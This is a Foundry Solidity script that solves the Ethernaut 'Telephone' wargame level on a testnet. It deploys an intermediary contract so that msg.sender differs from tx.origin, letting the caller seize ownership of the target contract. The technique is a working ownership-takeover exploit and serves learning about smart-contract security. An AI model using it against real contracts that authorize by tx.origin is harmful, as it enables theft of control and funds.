// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Telephone} from "../src/Telephone.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/Telephone.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv 

contract TelephoneSolution is Script {

    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = (vm.envAddress("TELEPHONE_INSTANCE"));

    address public owner = vm.envAddress("MY_ADDRESS");

    /* Attack idea: To bypass the check in the changeOwner function, we can call the changeOwner function with another contract.
        The tx.origin will be our EOA address and the msg.sender will be the contract address.
        This way we can change the owner of the contract to any address we want.
    */

    function run() external {

        vm.startBroadcast(deployerPrivateKey);
        // create a new contract instance
        Middlecontract middlecontract = new Middlecontract(instance);
        // call the changeOwner function with the new contract instance
        middlecontract.changeOwner(owner);
        vm.stopBroadcast();
    }

}

contract Middlecontract {
    Telephone public telephone;
    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function changeOwner(address _owner) public {
        telephone.changeOwner(_owner);
    }
}